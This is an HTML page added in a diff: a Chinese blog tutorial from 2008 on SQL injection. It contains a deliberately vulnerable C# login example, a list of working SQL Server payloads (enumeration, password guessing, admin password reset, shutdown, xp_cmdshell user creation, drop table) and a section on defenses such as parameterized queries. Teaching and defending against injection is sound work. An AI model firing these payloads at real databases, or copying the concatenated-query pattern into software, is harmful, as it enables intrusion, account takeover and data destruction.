@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+  <base href="http://blog.coderzh.com/">
+  <script>
+    document._writeOriginal = document.write;
+    document.write = function(str) {
+        if (str.indexOf("http://blog.coderzh.com") > -1) {
+            document._writeOriginal(str);
+        } else {
+            document._writeOriginal('<!-- Be Hijack!! -->');
+        }
+    }
+  </script>
+  <title>(原创)攻击方式学习之(2) - SQL注入(SQL Injection) - CoderZh Blog</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+<meta name="description" content="简介 有些网站将直接拿用户的输入 来拼接SQL语句，进行查询等操作，同时也将错误信息暴露给用户。这就给不怀好意的同学可乘之机，利用输入一些奇特的">
+<meta name="author" content="coderzh">
+<meta name="publisher" content="coderzh">
+<meta name="generator" content="http://gohugo.io/"/>
+
+<meta itemprop="name" content="(原创)攻击方式学习之(2) - SQL注入(SQL Injection) - CoderZh Blog">
+<meta itemprop="description" content="简介 有些网站将直接拿用户的输入 来拼接SQL语句，进行查询等操作，同时也将错误信息暴露给用户。这就给不怀好意的同学可乘之机，利用输入一些奇特的">
+<meta itemprop="image" content="http://blog.coderzh.com/public/coderzh.jpg">
+
+<meta property="og:title" content="(原创)攻击方式学习之(2) - SQL注入(SQL Injection) - CoderZh Blog" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://blog.coderzh.com/2008/09/06/1285556/" />
+<meta property="og:image" content="http://blog.coderzh.com/public/coderzh.jpg" />
+<meta property="og:description" content="简介 有些网站将直接拿用户的输入 来拼接SQL语句，进行查询等操作，同时也将错误信息暴露给用户。这就给不怀好意的同学可乘之机，利用输入一些奇特的">
+
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@coderzh">
+<meta name="twitter:title" content="(原创)攻击方式学习之(2) - SQL注入(SQL Injection) - CoderZh Blog">
+<meta name="twitter:description" content="简介 有些网站将直接拿用户的输入 来拼接SQL语句，进行查询等操作，同时也将错误信息暴露给用户。这就给不怀好意的同学可乘之机，利用输入一些奇特的">
+<meta name="twitter:creator" content="@coderzh">
+<meta name="twitter:image" content="http://blog.coderzh.com/public/coderzh.jpg">
+
+  <script>document.documentElement.className = document.documentElement.className.replace("no-js", "js");</script>
+  <link rel="canonical" href="http://blog.coderzh.com/2008/09/06/1285556/">
+  <link rel='shortlink' href="http://blog.coderzh.com/2008/09/06/1285556/"/>
+  <link rel="shortcut icon" href="http://blog.coderzh.com/public/favicon.ico"/>
+  
+<link rel="stylesheet" id="human-style-css" href="http://blog.coderzh.com/wp-content/themes/hueman/style.css" type="text/css" media="all"/>
+<link rel="stylesheet" id="human-style-css2" href="http://blog.coderzh.com/wp-content/themes/hueman-child/style.css" type="text/css" media="all"/>
+<link rel="stylesheet" id="responsive-css" href="http://blog.coderzh.com/wp-content/themes/hueman/responsive.css" type="text/css" media="all"/>
+<link rel="stylesheet" id="font-awesome-css" href="http://blog.coderzh.com/wp-content/themes/hueman/fonts/font-awesome.min.css" type="text/css" media="all"/>
+<link rel="stylesheet" href="http://blog.coderzh.com/public/highlight/styles/github.css">
+<script src="http://blog.coderzh.com/public/highlight/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<link rel="stylesheet" id="human-style-css3" href="http://blog.coderzh.com/wp-content/themes/hueman-child/user.css" type="text/css" media="all"/>
+<link rel="stylesheet" href="public/font/hack/css/hack.min.css">
+
+<script type="text/javascript" src="assets/js/jquery-2.1.1.min.js"></script>
+<script type="text/javascript" src="wp-content/themes/hueman/js/jquery.jplayer.min.js"></script>
+<script type="text/javascript" src="wp-content/themes/hueman/js/scripts.js"></script>
+<script type="text/javascript" src="assets/picturefill/picturefill.min.js"></script>
+<script type="text/javascript" src="assets/js/jquery.matchHeight-min.js"></script>
+<script type="text/javascript" async defer src="assets/js/myblog.js"></script>
+
+</head>
+
+<body class="single single-post single-format-standard col-3cm full-width topbar-enabled chrome">
+<div id="wrapper">
+  <header id="header">
+
+  <nav class="nav-container group" id="nav-topbar">
+    <div class="nav-toggle"><i class="fa fa-bars"></i></div>
+    <div class="nav-text"></div>
+    <div class="nav-wrap container">
+      <a rel="nofollow" href="http://blog.coderzh.com/" class="nav-cs-icon">
+        <img width="40" height="40" src="http://blog.coderzh.com/public/coderzh.jpg" alt="coderzh" title="Home">
+      </a>
+      <ul id="menu-default-menu" class="nav container-inner group">
+        <li class="menu-item menu-item-type-post_type menu-item-object-page">
+          <a rel="nofollow" href="http://blog.coderzh.com/">首页</a>
+        </li>
+        
+        <li class="menu-item menu-item-type-post_type menu-item-object-page">
+          <a rel="nofollow" href="http://blog.coderzh.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a>
+        </li>
+        
+        <li class="menu-item menu-item-type-post_type menu-item-object-page">
+          <a rel="nofollow" href="http://blog.coderzh.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
+        </li>
+        
+        <li class="menu-item menu-item-type-post_type menu-item-object-page">
+          <a rel="nofollow" href="http://blog.coderzh.com/categories/%E6%80%9D%E8%80%83%E6%84%9F%E6%82%9F/">思考感悟</a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-type-post_type menu-item-object-page">
+          <a rel="nofollow" href="http://blog.coderzh.com/post/">归档</a>
+        </li>
+        
+        <li class="menu-item menu-item-type-post_type menu-item-object-page">
+          <a rel="nofollow" href="http://blog.coderzh.com/about/">关于我</a>
+        </li>
+        
+        <li class="menu-item menu-item-type-post_type menu-item-object-page">
+          <a rel="nofollow" href="http://blog.coderzh.com/feed.xml" type="application/rss+xml" target="_blank">订阅</a>
+        </li>
+        <li class="menu-item menu-item-type-post_type menu-item-text">
+        一个程序员的思考与总结
+        </li>
+      </ul>
+    </div>
+
+    <div class="container">
+      <div class="container-inner">
+        <div class="toggle-search"><i class="fa fa-search"></i></div>
+        <div class="search-expand">
+          <div class="search-expand-inner">
+            <form method="get" class="searchform themeform" action="https://www.google.com/search">
+              <div>
+                <input type="text" class="search" name="q" placeholder="Press enter to start searching">
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+      
+    </div>
+    
+
+  </nav>
+  
+
+  <div class="container group">
+    <div class="container-inner">
+
+      <div class="group pad">
+
+        <div class="group pad">
+          <h1 class="site-title">
+            <a rel="nofollow" href="http://blog.coderzh.com/" rel="home">
+              <img style="border-radius: 50%;width:72px;height:72px;margin:0 auto;" alt="coderzh" src="http://blog.coderzh.com/public/coderzh.jpg"></img>
+              CoderZh Blog
+            </a>
+          </h1>
+          <p class="site-description"> 如果你没有感觉到时间不够用时，你多半正在虚度光阴。 </p>
+        </div>
+
+      </div>
+    </div>
+    
+  </div>
+  
+
+</header>
+
+
+
+  <div class="container" id="page">
+    <div class="container-inner">
+      <div class="main">
+        <div class="main-inner group">
+          <section class="content">
+            <div class="page-title pad group">
+              <ul class="meta-single group">
+                
+                <li class="category">
+                  <a href="http://blog.coderzh.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/" rel="category tag">技术文章</a>
+                </li>
+                
+              </ul>
+            </div>
+
+            <div class="pad group">
+
+              <article
+                  class="post type-post status-publish format-standard has-post-thumbnail hentry category-australien tag-bondi-beach tag-city2surf tag-sydney">
+                <div class="post-inner group">
+
+                  <h1 class="post-title">(原创)攻击方式学习之(2) - SQL注入(SQL Injection)</h1>
+
+                  <p class="post-byline">
+                    by  · 2008年09月06日 · 1791 Words ·
+                    ~4min reading time |
+                    <a href="https://github.com/coderzh/coderzh-hugo-blog/blob/master/content/post/cnblogs/2008-09-06-1285556.md"
+                       target="_blank">Improve on <i class="fa fa-github"></i></a>
+                  </p>
+
+                  <div class="clear"></div>
+
+                  <div class="entry">
+                    <div class="entry-inner">
+                      
+                      
+
+<h3 id="简介:5a00c558a4965722e8228c1d008385c3">简介</h3>
+
+<p>有些网站将直接拿用户的输入 来拼接SQL语句，进行查询等操作，同时也将错误信息暴露给用户。这就给不怀好意的同学可乘之机，利用输入一些奇特的查询字符串，拼接成特定的SQL语 句，即可达到注入的目的。不仅可以获取数据库重要信息，权限没有设置好的话甚至可以删除掉整个表。因此，SQL注入漏洞还是相当的严重的。发现以前偶刚学 写的网站的时候也是靠拼接SQL语句吃饭滴&#8230;&#8230;</p>
+
+<h3 id="示例:5a00c558a4965722e8228c1d008385c3">示例</h3>
+
+<p>为了更好了学习和了解SQL注入的方法，做了一个示例网页，界面如下：</p>
+
+<p><img src="http://www.cnblogs.com/images/cnblogs_com/coderzh/security/example.JPG" alt="" />&nbsp;</p>
+
+<p>[](<a href="http://192.168.58.29/SQLInjection/Default.aspx">http://192.168.58.29/SQLInjection/Default.aspx</a>)</p>
+
+<p>点击登陆这块的代码如下，注意第5行，我们使用了拼接SQL语句：</p>
+
+<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #fb660a; font-weight: bold;">private</span> <span style="color: #fb660a; font-weight: bold;">void</span> <span style="color: #ff0086; font-weight: bold;">Login</span><span style="color: #ffffff;">()</span>
+
+<span style="color: #fb660a; font-weight: bold;">{</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #cdcaa9; font-weight: bold;">string</span> <span style="color: #ffffff;">uname</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">tbName</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Text</span><span style="color: #ffffff;">;</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #cdcaa9; font-weight: bold;">string</span> <span style="color: #ffffff;">pwd</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">tbPassword</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Text</span><span style="color: #ffffff;">;</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #cdcaa9; font-weight: bold;">string</span> <span style="color: #ffffff;">sqlCmd</span> <span style="color: #ffffff;">=</span> <span style="color: #0086d2;">"select * from [Users] where UserName = '"</span> <span style="color: #ffffff;">+</span> <span style="color: #ffffff;">uname</span> <span style="color: #ffffff;">+</span> <span style="color: #0086d2;">"'"</span><span style="color: #ffffff;">;</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #cdcaa9; font-weight: bold;">string</span> <span style="color: #ffffff;">sqlCmdRep</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">sqlCmd</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Replace</span><span style="color: #ffffff;">(</span><span style="color: #0086d2;">"Users"</span><span style="color: #ffffff;">,</span> <span style="color: #0086d2;">"XXX"</span><span style="color: #ffffff;">).</span><span style="color: #ffffff;">Replace</span><span style="color: #ffffff;">(</span><span style="color: #0086d2;">"UserName"</span><span style="color: #ffffff;">,</span> <span style="color: #0086d2;">"XXX"</span><span style="color: #ffffff;">);</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">lbSQL</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Text</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">sqlCmdRep</span><span style="color: #ffffff;">;</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">try</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">{</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">DataTable</span> <span style="color: #ffffff;">dt</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">DataSQLServer</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">GetDataTable</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">sqlCmd</span><span style="color: #ffffff;">);</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">gvResult</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">DataSource</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">dt</span><span style="color: #ffffff;">;</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">gvResult</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">DataBind</span><span style="color: #ffffff;">();</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">if</span> <span style="color: #ffffff;">(</span><span style="color: #ffffff;">dt</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Rows</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Count</span> <span style="color: #ffffff;">==</span> <span style="color: #0086f7; font-weight: bold;">1</span> <span style="color: #ffffff;">&amp;&amp;</span> <span style="color: #ffffff;">pwd</span> <span style="color: #ffffff;">==</span> <span style="color: #ffffff;">dt</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Rows</span><span style="color: #ffffff;">[</span><span style="color: #0086f7; font-weight: bold;">0</span><span style="color: #ffffff;">][</span><span style="color: #0086d2;">"Password"</span><span style="color: #ffffff;">].</span><span style="color: #ffffff;">ToString</span><span style="color: #ffffff;">())</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">{</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">lbRes</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Text</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">dt</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Rows</span><span style="color: #ffffff;">[</span><span style="color: #0086f7; font-weight: bold;">0</span><span style="color: #ffffff;">][</span><span style="color: #0086d2;">"UserName"</span><span style="color: #ffffff;">]</span> <span style="color: #ffffff;">+</span> <span style="color: #0086d2;">" Login Success!"</span><span style="color: #ffffff;">;</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">}</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">else</span> <span style="color: #ff0086; font-weight: bold;">if</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">dt</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Rows</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Count</span> <span style="color: #ffffff;">==</span> <span style="color: #0086f7; font-weight: bold;">0</span><span style="color: #ffffff;">)</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">{</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">lbRes</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Text</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">uname</span> <span style="color: #ffffff;">+</span> <span style="color: #0086d2;">" not exist!"</span><span style="color: #ffffff;">;</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">}</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">else</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">{</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">lbRes</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Text</span> <span style="color: #ffffff;">=</span> <span style="color: #0086d2;">"Login Fail!"</span><span style="color: #ffffff;">;</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">}</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">}</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">catch</span> <span style="color: #ffffff;">(</span><span style="color: #ffffff;">Exception</span> <span style="color: #ffffff;">ex</span><span style="color: #ffffff;">)</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">{</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">lbRes</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Text</span> <span style="color: #ffffff;">=</span> <span style="color: #0086d2;">"Error: "</span> <span style="color: #ffffff;">+</span> <span style="color: #ffffff;">ex</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Message</span><span style="color: #ffffff;">;</span>
+
+<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #fb660a; font-weight: bold;">}</span>
+
+<span style="color: #fb660a; font-weight: bold;">}</span></div>
+
+<p>详细具体的注入方法就不一一介绍了，欢迎下载该示例程序进行实战演练，点击界面的&#8220;注入指南&#8221;有详细的注入说明：</p>
+
+<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333;">1. 试探是否能够注入
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '
+
+2. 试探管理员用户名
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XXX
+
+3. 猜表名
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; admin'or 0&gt;(select count(*) from [XXX]) --
+
+&nbsp;&nbsp;&nbsp; 更狠的方法直接取表名：
+
+&nbsp;&nbsp;&nbsp; admin' and (Select Top 1 name from sysobjects where xtype='U')&gt;0&nbsp;&nbsp; --
+
+4. 猜列名
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; admin'and 0&lt; (select count(XXX) from [Users]) --
+
+&nbsp;&nbsp;&nbsp; 再来狠的取列名：
+
+&nbsp;&nbsp;&nbsp; admin' and (Select top 1 col_name(object_id('Users'), 3) from [Users])&gt;0&nbsp;&nbsp; --
+
+5. 猜密码长度
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; admin'and 1=(select count(*) from [Users] where len(Password)&lt;XXX) --
+
+6. 猜密码
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; admin'and 1=(select count(*) from [Users] where left(Password,2)='XX') --
+
+----------------------------------------------------------------------------------------------
+
+在探测出了表名和列表的时候，可以使用终极武器，直接修改admin的密码，或者做更加恶劣的破坏行为：
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; admin';update [Users] set Password='123' where UserName='admin' --
+
+----------------------------------------------------------------------------------------------
+
+其他恶劣行为：
+
+1. 直接关闭偶的SQL服务
+
+&nbsp;&nbsp;&nbsp; admin';shutdown --
+
+2. 如果使用sa用户并可能遭受的攻击：在偶机器上添加用户，并加入某个组织：
+
+&nbsp;&nbsp;&nbsp; admin';exec master..xp_cmdshell "net user name password /add" --
+
+&nbsp;&nbsp;&nbsp; admin';exec master..xp_cmdshell "net localgroup name administrators /add" --
+
+3. 直接备份数据库，然后下载下来，非常恶劣，建议不要对我使用。
+
+&nbsp;&nbsp;&nbsp; admin';backup database Test to disk='d:"1.db'--
+
+4. 直接删表，慎用啊
+
+&nbsp;&nbsp;&nbsp; admin';drop table abc --
+
+----------------------------------------------------------------------------------------------
+
+其他经验总结：
+
+1. 绕过单引号过滤
+
+&nbsp;&nbsp;&nbsp; where xtype='U'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ===&gt;&nbsp;&nbsp;&nbsp; where xtype=char(85)
+
+&nbsp;&nbsp;&nbsp; where name='用户'&nbsp;&nbsp;&nbsp; ===&gt;&nbsp;&nbsp;&nbsp; where name=nchar(29992)+nchar(25143)
+
+2. 取数据库名称
+
+&nbsp;&nbsp;&nbsp; admin' and db_name()&gt;0 --
+
+---------------------------------------------------------------------------------------------- 
+
+</div>
+
+<p>后面会介绍到如何安全的组装SQL语句。</p>
+
+<p>示例程序下载 :&nbsp;<a href="http://files.cnblogs.com/coderzh/SQLInjection.rar">SQLInjection.rar</a></p>
+
+<p>&nbsp;</p>
+
+<h3 id="探测:5a00c558a4965722e8228c1d008385c3">探测</h3>
+
+<ol>
+<li>非常简单，输入一个单引号(&lsquo;)，看页面是否出错，要是页面出错了，而且又将错误信息暴露给你了那就太好了。2.  从错误信息中观察确定是哪种数据库，比如Access，SQL Server等。不同数据库的SQL语句有些差别3.  静态代码分析，从代码中检查SQL语句是否是由字符串拼接而成。</li>
+</ol>
+
+<h3 id="实施方式:5a00c558a4965722e8228c1d008385c3">实施方式</h3>
+
+<p>详见示例网站</p>
+
+<h3 id="危害:5a00c558a4965722e8228c1d008385c3">危害</h3>
+
+<ol>
+<li>变态性的，服务器被远程控制，想干嘛干嘛。2.  盗取性的，盗取了数据库中的机密信息，谋取私利或其他。3.  破坏性的，直接破坏数据库。4.  修改性的，篡改数据，比如通过大学成绩查询修改成绩。5.  我也没干过，想不出来了。</li>
+</ol>
+
+<h3 id="防范:5a00c558a4965722e8228c1d008385c3">防范</h3>
+
+<p>在示例中也说明了如何防范，在这里再精炼一下所谓的防止SQL注入四大法宝：</p>
+
+<ol>
+<li><p>最小权限原则</p>
+
+<pre><code>*   特别是不要用dbo或者sa账户，为不同的类型的动作或者组建使用不同的账户，最小权限原则适用于所有与安全有关的场合。
+</code></pre></li>
+
+<li><p>在服务器端对用户输入进行过滤</p>
+
+<pre><code>*   我 们要对一些特殊字符，比如单引号，双引号，分号，逗号，冒号，连接号等进行转换或者过滤；使用强数据类型，比如你需要用户输入一个整数，就要把用户输入的 数据转换成整数形式；限制用户输入的长度等等。这些检查要放在server运行，client提交的任何东西都是不可信的。
+</code></pre></li>
+
+<li><p>以安全的方式创建SQL语句</p>
+
+<pre><code>*   不要再用万恶的字符串拼接SQL语句了，使用Parameter对象吧，比如C#中的：
+</code></pre>
+
+<div dir="ltr">
+<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #cdcaa9; font-weight: bold;">string</span> <span style="color: #ffffff;">sqlText</span> <span style="color: #ffffff;">=</span> <span style="color: #0086d2;">"select * from [Users] where UserName = @Name"</span><span style="color: #ffffff;">;</span>
+
+
+<span style="color: #ffffff;">SqlParameter</span> <span style="color: #ffffff;">nameParm</span> <span style="color: #ffffff;">=</span> <span style="color: #fb660a; font-weight: bold;">new</span> <span style="color: #ffffff;">SqlParameter</span><span style="color: #ffffff;">(</span><span style="color: #0086d2;">"Name"</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">uname</span><span style="color: #ffffff;">);</span>
+
+
+<span style="color: #ffffff;">sqlCmd</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">CommandText</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">sqlText</span><span style="color: #ffffff;">;</span>
+
+
+<span style="color: #ffffff;">sqlCmd</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Parameters</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Add</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">nameParm</span><span style="color: #ffffff;">);</span></div>
+</div></li>
+
+<li><p>错误信息不要暴露给用户</p>
+
+<pre><code>*   当sql运行出错时，不要把数据库返回的错误信息全部显示给用户，错误信息经常会透露一些数据库设计的细节。
+</code></pre></li>
+
+<li><p>特别注意：也许有很多人告诉过你使用存储过程能免受SQL注入攻击。这是错的！这只能阻止某些种类的攻击。比如存在sp_GetName存储过程，我们的代码如下：</p></li>
+
+<li><div dir="ltr">
+<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #cdcaa9; font-weight: bold;">string</span> <span style="color: #ffffff;">name</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">...;</span> <span style="color: #008800; font-style: italic; background-color: #0f140f;">//name from user</span>
+
+
+<span style="color: #ffffff;">SqlConnection</span> <span style="color: #ffffff;">conn</span> <span style="color: #ffffff;">=</span> <span style="color: #fb660a; font-weight: bold;">new</span> <span style="color: #ffffff;">SqlConnection</span><span style="color: #ffffff;">(...);</span>
+
+
+<span style="color: #ffffff;">conn</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">Open</span><span style="color: #ffffff;">();</span>
+
+
+<span style="color: #cdcaa9; font-weight: bold;">string</span> <span style="color: #ffffff;">sqlString</span> <span style="color: #ffffff;">=</span> <span style="color: #0086d2;">@"exec sp_GetName '"</span> <span style="color: #ffffff;">+</span> <span style="color: #ffffff;">name</span> <span style="color: #ffffff;">+</span> <span style="color: #0086d2;">"'"</span><span style="color: #ffffff;">;</span>
+
+
+<span style="color: #ffffff;">SqlCommand</span> <span style="color: #ffffff;">cmd</span> <span style="color: #ffffff;">=</span> <span style="color: #fb660a; font-weight: bold;">new</span> <span style="color: #ffffff;">SqlCommand</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">sqlString</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">conn</span><span style="color: #ffffff;">);</span></div>
+</div>
+
+<pre><code>*   我们试图输入&quot;Black' or 1=1 --&quot;将会失败，但下面的操作却是合法的：
+</code></pre>
+
+<div dir="ltr">
+<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;">exec sp_GetName 'Black' insert into Users values(2008, 'Green') -- '</div>
+</div></li>
+</ol>
+
+<h3 id="参考资料:5a00c558a4965722e8228c1d008385c3">参考资料</h3>
+
+<ol>
+<li>Michael Howard, David LeBlanc. &ldquo;Writing Secure Code&rdquo;</li>
+
+<li><p>Mike Andrews, James A. Whittaker &ldquo;How to Break Web Software&rdquo;</p></li>
+
+<li><p><a href="http://www.secnumen.com/technology/anquanwenzhai.htm">http://www.secnumen.com/technology/anquanwenzhai.htm</a></p></li>
+</ol>
+
+<p>下一篇是更好玩的：<a href="http://www.cnblogs.com/coderzh/archive/2008/09/06/1285693.html">(原创)攻击方式学习之(3) - 缓冲区溢出(Buffer Overflow)</a></p>
+
+<p><strong>[温馨提示]：该文章由原博客园导入而来，如排版效果不佳，请移步：<a href="http://www.cnblogs.com/coderzh/archive/2008/09/06/1285556.html">http://www.cnblogs.com/coderzh/archive/2008/09/06/1285556.html</a></strong></p>
+
+                      
+                    </div>
+                    <div style="border: 1px dashed #e0e0e0; padding: 10px 10px 10px 10px; background-color: #fffeee; background-repeat: no-repeat; background-attachment: scroll; background-position: 1% 50%; -moz-background-size: auto auto; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inline-policy: -moz-initial;">
+                        <div style="float:left;margin-top:0px;">
+                        <img src="http://blog.coderzh.com/public/qrcode.jpg" width="129px" height="129px"/>
+                        <div style="text-align:center;">微信扫一扫</div>
+                        </div>
+                        <div>
+                            <p style="margin-top:0px;">作者：<a target="_blank" href="http://blog.coderzh.com/">CoderZh</a>
+                            <br />微信关注：hacker-thinking （一个程序员的思考）
+                            <br />本文出处：<a target="_blank" href="http://blog.coderzh.com/2008/09/06/1285556/">http://blog.coderzh.com/2008/09/06/1285556/</a>
+                            <br />
+                            文章版权归本人所有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留追究法律责任的权利。 </p>
+                        </div>
+                    </div>
+                    <div class="clear"></div>
+                  </div>
+                  
+
+                </div>
+                
+              </article>
+              
+
+              <div class="clear"></div>
+
+              <p class="post-tags">
+                <span>Tags:</span>
+                
+              </p>
+
+              <h4 class="heading">
+  <i class="fa fa-hand-o-right"></i>Related posts</h4>
+
+    <ul class="related-posts group">
+    
+    
+    
+        
+        
+        
+    
+        
+        
+        
+    
+        
+        
+        
+    
+        
+        
+        
+    
+        
+        
+        
+    
+    </ul>
+
+
+
+              <section id="comments" class="themeform">
+<div class="ds-thread" data-thread-key="/2008/09/06/1285556/" data-title="(原创)攻击方式学习之(2) - SQL注入(SQL Injection)" data-url="http://blog.coderzh.com/2008/09/06/1285556/"></div>
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"coderzh"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+</section>
+
+
+              
+            </div>
+
+
+          </section>
+          <div class="sidebar s1">
